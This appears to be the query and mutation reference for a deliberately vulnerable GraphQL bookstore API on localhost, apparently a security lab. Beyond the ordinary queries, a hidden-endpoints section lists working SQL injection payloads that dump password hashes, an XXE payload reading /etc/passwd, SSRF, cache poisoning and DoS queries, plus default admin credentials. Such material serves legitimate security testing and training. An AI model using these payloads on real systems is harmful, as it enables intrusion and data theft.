# GraphQL Bookstore API - Query & Mutation Reference

## Base URL
```
http://localhost:4000/graphql
```

## Authentication
Most mutations and some queries require authentication. Include the JWT token in the Authorization header:
```
Authorization: Bearer <token>
```

## Important: Use Files for Queries
**Always use a file to send GraphQL queries** to avoid bash escaping issues with quotes. This is especially important for mutations with arguments.

```bash
# Create query file
cat > /tmp/query.json << 'EOF'
{"query":"mutation { login(username: \"admin\", password: \"password123\") { token } }"}
EOF

# Send request
curl -X POST http://localhost:4000/graphql \
  -H 'Content-Type: application/json' \
  --data-binary @/tmp/query.json
```

---

## QUERIES (No Auth Required)

### Introspection
```graphql
query { __schema { types { name } } }
```

### Get Current User (Auth Required)
```graphql
query { me { id username email role firstName lastName phone } }
```

### List All Books
```graphql
query { books { id title price stockQuantity author { firstName lastName } } }
```

### Search Books
```graphql
query { books(search: "clean") { id title price } }
```

### Get Single Book
```graphql
query { book(id: 1) { id title description price isbn stockQuantity } }
```

### Get Book Reviews
```graphql
query { bookReviews(bookId: 1) { id rating comment userId } }
```

### Get My Reviews (Auth Required)
```graphql
query { myReviews { id bookId rating comment } }
```

### Get Cart (Auth Required)
```graphql
query { cart { id items { bookId quantity title price } } }
```

### Get Orders (Auth Required)
```graphql
query { orders { id orderNumber status totalAmount paymentStatus } }
```

### Get Webhooks (Auth Required)
```graphql
query { webhooks { id url events isActive } }
```

---

## MUTATIONS

### Register User
```graphql
mutation { 
  register(
    username: "newuser", 
    password: "password123", 
    firstName: "John", 
    lastName: "Doe"
  ) { 
    success 
    token 
    user { id username role } 
  } 
}
```

### Login
```graphql
mutation { 
  login(username: "admin", password: "password123") { 
    success 
    token 
    user { id username role } 
  } 
}
```

### Update Profile (Auth Required)
```graphql
mutation { 
  updateProfile(
    firstName: "Updated", 
    lastName: "Name", 
    phone: "555-1234",
    address: "123 Main St",
    city: "New York",
    state: "NY",
    zipCode: "10001"
  ) { 
    id username firstName lastName phone 
  } 
}
```

### Add to Cart (Auth Required)
```graphql
mutation { addToCart(bookId: 1, quantity: 2) { success message } }
```

### Remove from Cart (Auth Required)
```graphql
mutation { removeFromCart(bookId: 1) { success message } }
```

### Apply Coupon (Auth Required)
```graphql
mutation { applyCoupon(code: "WELCOME10") { success message discountAmount couponCode } }
```

**Important:** Always use a file to send queries with arguments to avoid bash escaping issues:
```bash
# Create query file
cat > /tmp/apply_coupon.json << 'EOF'
{"query":"mutation { applyCoupon(code: \"WELCOME10\") { success message } }"}
EOF

# Send request
curl -X POST http://localhost:4000/graphql \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer YOUR_TOKEN" \
  --data-binary @/tmp/apply_coupon.json
```

### Create Order (Auth Required)
```graphql
mutation { createOrder() { success orderId totalAmount } }
```

### Purchase Cart (Auth Required)
```graphql
mutation { 
  purchaseCart(
    cardNumber: "VBNK1234567890", 
    expiry: "12/25", 
    cvv: "123"
  ) { 
    success 
    orderId 
    totalAmount 
  } 
}
```

### Cancel Order (Auth Required)
```graphql
mutation { cancelOrder(orderId: "uuid-here") { success message } }
```

### Create Review (Auth Required)
```graphql
mutation { 
  createReview(
    bookId: 1, 
    rating: 5, 
    comment: "Excellent book!"
  ) { 
    success 
    message 
  } 
}
```

### Delete Review (Auth Required)
```graphql
mutation { deleteReview(reviewId: 1) { success message } }
```

### Register Webhook (Auth Required)
```graphql
mutation { 
  registerWebhook(
    url: "http://example.com/webhook",
    events: "[\"order.created\", \"order.cancelled\"]",
    secret: "mysecret"
  ) { 
    success 
    webhookId 
  } 
}
```

### Test Webhook (Auth Required)
```graphql
mutation { testWebhook(webhookId: "uuid-here") { success message } }
```

---

## HIDDEN/ADMIN QUERIES (No Auth - Security Vulnerabilities)

### Internal User Search
```graphql
query { _internalUserSearch(username: "admin") { id username role } }
```

### Fetch External Resource (SSRF)
```graphql
query { _fetchExternalResource(url: "http://example.com") }
```

### Advanced Search (SQL Injection)
```graphql
query { _searchAdvanced(query: "%" OR 1=1) { id title } }
```

**Working SQL Injection Payloads:**
- `%` OR 1=1 - Returns all books
- `' UNION SELECT username,password_hash,3,4,5,6,7,8 FROM users-- - Extract user data

### Admin Stats
```graphql
query { _adminStats { userCount bookCount totalRevenue } }
```

### Admin All Orders
```graphql
query { _adminAllOrders { id orderNumber totalAmount } }
```

### Admin All Payments
```graphql
query { _adminAllPayments { id amount status } }
```

### Batch Query (Bypasses Rate Limiting)
```graphql
query { _batchQuery(queries: "{\"query\": \"{ books { id } }\"}") }
```

### Process XML Data (XXE Vulnerability)
```graphql
query { processXMLData(xml: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>") }
```

### Decode JWT (Algorithm Confusion)
```graphql
query { decodeJWT(token: "eyJ...") { header payload } }
```

### Manage Cache (Cache Poisoning)
```graphql
query { manageCache(action: "set", key: "user_1", value: "admin") }
```

### Handle Recursive Query (DoS)
```graphql
query { handleRecursiveQuery(depth: 100) { id nested { id nested { id } } } }
```

---

## Complete Flow Example

```bash
# 1. Register
curl -X POST http://localhost:4000/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { register(username: \"testuser\", password: \"pass123\", firstName: \"Test\", lastName: \"User\") { token } }"}'

# 2. Login (get token)
TOKEN="your-token-here"
curl -X POST http://localhost:4000/graphql \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { login(username: \"testuser\", password: \"pass123\") { token } }"}'

# 3. Add to cart
curl -X POST http://localhost:4000/graphql \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { addToCart(bookId: 1, quantity: 2) { success message } }"}'

# 4. Apply coupon
curl -X POST http://localhost:4000/graphql \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { applyCoupon(code: \"WELCOME10\") { success discountAmount } }"}'

# 5. Create order
curl -X POST http://localhost:4000/graphql \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { createOrder() { success orderId totalAmount } }"}'

# 6. View orders
curl -X POST http://localhost:4000/graphql \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"query { orders { id orderNumber status totalAmount } }"}'
```

---

## Default Test Credentials

| Username | Password | Role |
|----------|----------|-------|
| admin    | password123 | admin |
| staff    | password123 | staff |
| user     | password123 | user |

---

## Test Coupons

| Code | Type | Value |
|------|------|-------|
| WELCOME10 | percentage | 10% |
